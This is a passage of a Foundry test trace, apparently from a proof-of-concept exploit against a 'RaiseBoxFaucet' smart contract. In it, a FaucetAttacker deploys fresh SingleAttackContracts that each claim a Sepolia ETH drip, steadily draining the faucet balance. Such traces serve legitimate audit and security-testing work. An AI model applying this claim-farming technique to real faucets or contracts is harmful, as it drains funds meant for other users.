    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 46) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [12021749] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [12020990] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [11984822] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [11977164] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 765000000000000000 [7.65e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xcC89F2Aa22433bd6cD6fAFA8542d1AEa88323c24
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 47) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [11719780] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [11719021] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [11682853] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [11675195] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 760000000000000000 [7.6e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x0861383469E8F51E5fF41546b687Ae23fA2fD4F1
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 48) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [11417811] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [11417052] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [11380884] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [11373226] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 755000000000000000 [7.55e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x57362F7a421feCA4985219e64c00745D98A5f14c
